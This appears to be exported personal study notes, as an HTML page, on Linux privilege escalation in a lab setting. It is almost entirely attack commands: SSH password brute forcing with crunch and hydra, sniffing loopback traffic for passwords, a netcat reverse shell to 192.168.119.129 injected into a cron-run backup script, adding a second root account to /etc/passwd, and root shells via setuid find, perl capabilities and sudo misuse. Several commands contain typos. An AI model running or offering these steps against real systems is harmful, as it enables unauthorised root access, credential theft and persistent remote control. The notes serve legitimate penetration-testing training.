<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux Privilege Escalation</h1><br/><p><h3>### Linux Enumeration</h3></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">id</span> <br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span> <br /><span style="color:#ff9d00;font-weight:700">hostname</span><br /><br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>issue<br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>os-release<br /><span style="color:#ff9d00;font-weight:700">uname</span> -a<br /><br /><span style="color:#ff9d00;font-weight:700">ps</span> aux<br /><br />ip a<br /><span style="color:#ff9d00;font-weight:700">ifconfig</span> a<br />route<span style="color:#ff9d00;font-weight:700">/</span>routel<br /><br /><span style="color:#0088ff;font-weight:400"># active connections, open ports</span><br />ss -anp<br /><br /><span style="color:#0088ff;font-weight:400"># firewall</span><br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>iptables<br /><br /><span style="color:#0088ff;font-weight:400"># scheduled tasks</span><br /><span style="color:#ff9d00;font-weight:700">ls</span> -lah <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>cron*<br />crontab -l<br /><span style="color:#ff9d00;font-weight:700">sudo</span> crontab -l<br /><br /><span style="color:#0088ff;font-weight:400"># pmanually installed package managers</span><br />dpkg -l<br /><br /><span style="color:#0088ff;font-weight:400"># find writable files</span><br /><span style="color:#ff9d00;font-weight:700">find</span> -writable -type d 2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br /><br /><span style="color:#0088ff;font-weight:400"># list mounted file systems</span><br /><span style="color:#ff9d00;font-weight:700">mount</span><br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>fstab <span style="color:#0088ff;font-weight:400"># list all drives mounted at boot time</span><br />lsblk <span style="color:#0088ff;font-weight:400"># all available disks</span><br /><br /><span style="color:#ff9d00;font-weight:700">lsmod</span> <span style="color:#0088ff;font-weight:400"># enumerate kernel modules</span><br /><span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>modinfo &lt;module&gt; <span style="color:#0088ff;font-weight:400"># info about specific module</span><br /><br /><span style="color:#0088ff;font-weight:400"># setuid, setgid</span><br /><span style="color:#0088ff;font-weight:400"># search </span><br /><span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span> -perm -u=s -type f 2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br /><br /><br /><br /><br /><br /></pre></div></p><p><h3>### Automated Enumeration</h3></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#</span><br />unix-privesc-check<br />.<span style="color:#ff9d00;font-weight:700">/</span>unix-privesc-check standard &gt; output.txt</pre></div></p><p></p><p><h3>### Inspecting User Trails</h3></p><p><div class="codebox"><pre>.bashrc<br /><br /><span style="color:#0088ff;font-weight:400"># create wordlist for bruteforce</span><br />crunch 6 6 -t Lab%%% &gt; wordlist<br /><br /><span style="color:#0088ff;font-weight:400"># bruteforce with hydra</span><br />hydra -1 eve -P wordlist 192.168.129.214 -t 4 <span style="color:#ff9d00;font-weight:700">ssh</span><br /><br /><span style="color:#ff9d00;font-weight:700">sudo</span> -l<br /><span style="color:#ff9d00;font-weight:700">sudo</span> -i<br /></pre></div></p><p></p><p></p><p><h3>### Inspecting Service Footprints</h3></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#watch system activities that holds passwords or other</span><br />watch -n 1 <span style="color:#3ad900;font-weight:400">&quot;ps - aux I grep pass&quot;</span><br /><br /><span style="color:#ff9d00;font-weight:700">sudo</span> tcpdump -i lo -A <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> <span style="color:#3ad900;font-weight:400">&quot;pass&quot;</span><br /></pre></div></p><p></p><p><h3>### Misconfigured file permissions</h3></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># abusing Cron jobs</span><br /><span style="color:#ff9d00;font-weight:700">grep</span> <span style="color:#3ad900;font-weight:400">&quot;CRON&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>log<span style="color:#ff9d00;font-weight:700">/</span>syslog<br /><br /><span style="color:#0088ff;font-weight:400"># revshell</span><br />joe@debian-privesc<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.scripts <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;rm /tmp/f;mkfifo /tmp/f;cat/tmp/f|/bin/sh -i 2&gt;&amp;1|nc<br />192.168.119.129 1234 &gt;/tmp/f&quot;</span> &gt;&gt; user_backups.sh</pre></div></p><p></p><p><h3>### Abusing Password Authentication</h3></p><p>if we can write /etc/passwd</p><p><div class="codebox"><pre>openssl <span style="color:#ff9d00;font-weight:700">passwd</span> PASS<br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;root2:16zpgl8z18tp6:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span></pre></div></p><p><h3>### Abusing setuid</h3></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">grep</span> Uid <span style="color:#ff9d00;font-weight:700">/</span>proc<span style="color:#ff9d00;font-weight:700">/</span>5489<span style="color:#ff9d00;font-weight:700">/</span>status<br /><br /><span style="color:#0088ff;font-weight:400"># if find has setuid</span><br /><span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>joe<span style="color:#ff9d00;font-weight:700">/</span>Desktop -exec <span style="color:#3ad900;font-weight:400">&quot;/us/bin/bash&quot;</span> -p<span style="color:#333333;font-weight:400">\;</span><br /><span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span>bin -perm -4000 <span style="color:#0088ff;font-weight:400"># find setuid</span><br /><br /><span style="color:#0088ff;font-weight:400"># search cap_setuid files</span><br /><span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>getcap -r <span style="color:#ff9d00;font-weight:700">/</span> 2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br /><br /><span style="color:#0088ff;font-weight:400"># https://gtfobins.github.io/gtfobins/perl/#capabilities</span><br /><span style="color:#0088ff;font-weight:400"># contains examples for some cap_setuid we could find</span><br /><br /><span style="color:#ff9d00;font-weight:700">perl</span> -e <span style="color:#3ad900;font-weight:400">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;</span></pre></div></p><p></p><p><h3>### Abusing sudo</h3> </p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sudo</span> -l<br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>sudoes<br /><br /><span style="color:#0088ff;font-weight:400"># example tcpdump (gtfobins)</span><br /><span style="color:#0088ff;font-weight:400"># big command failed</span><br /><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>log<span style="color:#ff9d00;font-weight:700">/</span>syslog <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> tcpdump<br /><span style="color:#0088ff;font-weight:400"># apparmor blocked our gtfobins</span><br /><br /><span style="color:#0088ff;font-weight:400"># example apt-get</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> apt-get changelog apt</pre></div></p><p></p><p>### Exploiting Kernel Vulnerabilities</p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>issue<br /><span style="color:#ff9d00;font-weight:700">uname</span> -r<br />arch<br /><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ searchsploit <span style="color:#3ad900;font-weight:400">&quot;linux kernel Ubuntu 16 Local Privilege Escalation&quot;</span> <span style="color:#ff9d00;font-weight:700">grep</span> <span style="color:#3ad900;font-weight:400">&quot;4<br />.&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -v <span style="color:#3ad900;font-weight:400">&quot; &lt; 4.4.0&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -v <span style="color:#3ad900;font-weight:400">&quot;4.8&quot;</span></pre></div></p></div>
</body>
</html>
